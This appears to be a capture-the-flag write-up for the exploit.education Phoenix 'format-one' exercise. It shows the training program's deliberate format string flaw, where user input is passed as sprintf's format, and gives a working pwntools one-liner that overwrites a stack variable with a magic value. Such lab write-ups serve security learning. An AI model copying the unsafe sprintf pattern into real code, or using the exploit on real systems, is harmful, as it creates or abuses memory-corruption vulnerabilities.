Even more format string fun!

### Source code

```c
/*
 * phoenix/format-one, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * Why did the Tomato blush? It saw the salad dressing!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0x45764f6c) {
    printf("Uh oh, 'changeme' is not the magic value, it is 0x%08x\n",
        locals.changeme);
  } else {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  }

  exit(0);
}
```

Looks like this one wants changeme to be a specific value: `0x45764f6c`

Lets see what we can do:

dest is 32 bytes long, so we can fill that up, and then have the value of 0x..6c in there.

%32x will pad the number to 32 chars, which fills the buffer nicely. Again, i use  pwntools to pack the address for me:

```bash
python3 -c "import sys; from pwn import *; buf = b'%32x';buf+=p64(0x45764f6c);sys.stdout.buffer.write(buf)" | ./format-one
```

![](_attachments/Pasted%20image%2020230402122022.png)
